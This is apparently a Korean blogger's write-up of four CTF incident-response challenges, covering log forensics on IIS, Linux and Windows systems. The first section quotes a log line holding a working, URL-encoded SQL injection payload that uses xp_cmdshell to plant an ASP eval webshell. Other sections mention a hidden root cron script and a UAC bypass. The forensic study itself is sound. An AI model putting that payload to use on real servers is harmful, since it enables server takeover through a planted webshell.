![](https://blogfiles.pstatic.net/MjAyNDEwMDhfODkg/MDAxNzI4Mzk3MDQ4NDc1.8hTq1C2ic4JcCBrTDs8ipbWw-cKh4pz5QCWLh04emy8g.z2j8Y5P2SNLngciCif7U2su0K3Zh898Ym3KJHVYqmJog.PNG/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7_2024-10-08_213751.png?type=w1)

침해사고 분석은 처음 해봤는데 굉장히 재밌었다.

---

# AH-ING-PING

```
최근 회사의 웹 서버에서 비정상적인 활동이 감지되었습니다. 초기 조사 결과:

1. 웹 서버에 웹쉘이 업로드된 흔적이 발견되었습니다.

2. 공격자는 SQL 인젝션 취약점을 악용한 것으로 추정됩니다.

3. 해당 서버에는 IIS와 MS-SQL이 함께 운영 중입니다. 웹 로그를 분석하여 웹쉘 업로드 원인을 파악하고 플래그 값을 입력하세요.
```

주어지는 코드가 굉장히 긴데, 웹쉘을 업로드했다고 하길래 shell이라는 키워드로 로그를 찾아봤다. 총 6개의 로그가 뜨며 모두 공격 로그였다.

```bash
2024-01-08 02:51:07 10.10.103.133 GET /cart/cart_goods_search.asp order=1&searchNAME=aaaaa%27%29%3BEXEC%20master..xp_cmdshell%20%27echo%20%22%3C%25eval%20request%28%22abcdef%22%29%25%3E%3C%21%2D%2DfXlwcDRoUkNfM2h0XzJfM20wY2xsM1d7Tk9DQ0VMRQ%3D%3D%2D%2D%3E%22%3EE%3A%5CwebROOT%5CCRhappy20%5C1.asp%27-- 443 - sqlmap/1.2.10.42#dev+(http://sqlmap.org) - 200 0 0 319
```

이게 마지막 줄이고, echo나 eval이 있는 것을 보아 flag를 출력한 듯 보였다. 뒤에 base64 인코딩처럼 생긴게 있어서 디코딩해본 결과 플래그를 뒤집어 놓은 것이었고 그렇게 플래그가 도출되었다.

---

AJ-A-PING

서버에서 주기적으로 외부에 패킷을 보내고 있다는 연락을 관제팀으로부터 전달받았다. 시스템 로그를 분석하여 주기적으로 패킷을 발생시키는 파일을 확인하고 원인이 된 계정을 파악하세요.

문제가 어려워서 힌트가 꽤 나왔는데, 공격자 계정 생성 시간이 새벽 1시 20분이라는 것이 나에게 큰 힌트가 되었다.

로그를 몇 개 살펴보자면,

계정 생성 로그

```javascript
Sep 25 01:20:00 ubuntu accounts-daemon[680]: Could not talk to message bus to find uid of sender :1.178: GDBus.Error:org.freedesktop.DBus.Error.NameHasNoOw>
Sep 25 01:20:00 ubuntu accounts-daemon[680]: Could not talk to message bus to find uid of sender :1.178: GDBus.Error:org.freedesktop.DBus.Error.NameHasNoOw>
Sep 25 01:20:00 ubuntu accounts-daemon[680]: request by system-bus-name::1.178: create user 'curer'
Sep 25 01:20:00 ubuntu accounts-daemon[680]: Could not talk to message bus to find uid of sender :1.178: GDBus.Error:org.freedesktop.DBus.Error.NameHasNoOw>
Sep 25 01:20:00 ubuntu accounts-daemon[680]: Could not talk to message bus to find uid of sender :1.178: GDBus.Error:org.freedesktop.DBus.Error.NameHasNoOw>
Sep 25 01:20:01 ubuntu groupadd[5506]: group added to /etc/group: name=curer, GID=1003
```

sudo 로그, 여기서부터 의심할 수 있다.

```javascript
Sep 25 01:20:01 ubuntu accounts-daemon[5574]: Adding user `curer' to group `sudo' ...
Sep 25 01:20:01 ubuntu accounts-daemon[5611]: Adding user curer to group sudo
Sep 25 01:20:01 ubuntu gpasswd[5611]: user curer added by root to group sudo
```

프로그램 실행 로그

```javascript
Sep 25 01:26:48 ubuntu sudo[6281]:    curer : TTY=pts/1 ; PWD=/home/curer ; USER=root ; COMMAND=/usr/bin/su
Sep 25 01:26:48 ubuntu sudo[6281]: pam_unix(sudo:session): session opened for user root by curer(uid=0)
Sep 25 01:26:48 ubuntu su[6282]: (to root) curer on pts/1
Sep 25 01:26:48 ubuntu su[6282]: pam_unix(su:session): session opened for user root by curer(uid=0)
Sep 25 01:30:01 ubuntu CRON[6310]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep 25 01:30:01 ubuntu CRON[6311]: (root) CMD (bash ~/.../apache.sh)
Sep 25 01:30:59 ubuntu sshd[6319]: Accepted password for ubuntu from 121.165.167.193 port 64488 ssh2
```

curer가 root 권한을 가진 점이 의심스럽고, 그리고 그 권한으로 .../apache.sh라는 파일을 실행시킨 점에서 이 파일이 공격파일임을 유추할 수 있다. 왜냐하면 .으로 시작하는 파일은 ls에는 보이지 않기 때문에 관리자가 쉽게 눈치채지 못하기 떄문이다. root로 파일을 실행시키는 점에서 파일의 절대 경로는 /root/.../apache.sh라는 것을 알 수 있다.

---

CAN-DI-PING

문제를 아무데도 쓰지 않았다..

웹 통신 로그를 이용해서 공격자가 어떤 CVE를 이용한 공격을 했는지 맞추시오. 이런 문제였다.

힌트

문제가 발생되고 있는 HOST의 IP는 192.168.11.57로 확인되고 HTTP 프로토콜 패킷이 해당 IP로 들어오는 것이 확인됩니다. 추가적으로 HTTP헤더의 Accept-Encoding 값이 조작되어 들어오는 패킷이 있다고 관제팀으로 연락받았습니다.

문제를 볼 때는 알지 못했고 힌트를 받고 그대로 검색하니 나왔다. 이런 건 힌트 없이 어떻게 푸는거지..

---

GGA-Rr-PING

해당 PC 내에서 WinRAR를 통해 특정 악성 파일이 실행되어 권한상승을 진행한 후 외부 통신이 진행된 것으로 판단이 됩니다. 공격자의 서버와 이 PC가 연결된 후 공격자는 두 가지 행위를 등록합니다. 해당 두 가지 행위를 파악하여 등록된 이름을 각각 시간 순서대로 기입하세요.

힌트

해당 악성 실행파일은 권한상승 이후 2가지의 서비스를 등록합니다. 두 서비스를 찾아 등록된 이름을 각각 시간 순서대로 적으세요. 처음 사용된 바이너리) 권한상승을 위해 정상 프로그램인 ComputerDefaults.exe 를 이용합니다.

등록한 서비스는 각각 작업 스케쥴러(3시 50분경) 및 방화벽 규칙(4시경) 입니다.

이 문제도 힌트가 어느 정도 나온 이후에 접근해서 굉장히 쉽게 느껴졌다.

![](https://blogfiles.pstatic.net/MjAyNDEwMDlfMTE2/MDAxNzI4NDAxMDkwMjkz.KY3uwNdD28rjoFnZIh_q6xs-soZPTUqGkjm3m9K5NT4g.C9knldp9YCiCw5aYgqA9_Ldf9AtIeTn51yfZ3aUh3Dog.PNG/image.png?type=w1)

대표사진 삭제

사진 설명을 입력하세요.

방화벽 규칙 확인을 위해 Defender log랑 Firewall log를 찾아봤다. Firewall log에서 smvic.exe가 규칙을 추가하는 것을 관찰했고, 누가봐도 공격 프로그램이 규칙을 넣은 것을 알 수 있다. 문제가 규칙 이름을 요구했으므로 cnct를 찾아내면 된다.

![](https://blogfiles.pstatic.net/MjAyNDEwMDlfMjA5/MDAxNzI4NDAxMjIxODc1.hHofnGRUOlkV5ZpX5AFFgOmSQRDBB66QTqQiNN5bel8g.lC0zJoFCUiZhHeJF3J4jx9_sgXJAr4m6LSO-HUWQaiMg.PNG/image.png?type=w1)

대표사진 삭제

사진 설명을 입력하세요.

TaskScheduler에는 직관적으로 보이진 않지만, 수많은 업데이트와 인스턴스 실행 로그 사이에 작업 등록 로그가 있는 것을 확인할 수 있었다. 이름이 avupdate라는 것을 찾아내면 된다.

---

팀원이 집 사정이 갑자기 생기는 바람에 솔플을 했는데, 생각보다 나쁘지 않은 결과가 나왔다고 생각한다. 물론 포너블을 못 건들이고 리버싱도 쉬운 문제처럼 보였는데(근데 전체 0솔이다;;) 못 풀었다는 것은 아쉽다. arm64랑 QEMU를 빨리 공부해야겠다고 계속 느낀다.

본선이 수능날이어서 참여하지 못하는 것은 아쉽다고 생각했는데 전화가 안 왔다. 침해사고 4솔인데 본선 진출이 아니라고??? 참 의문점이 많은 대회이다..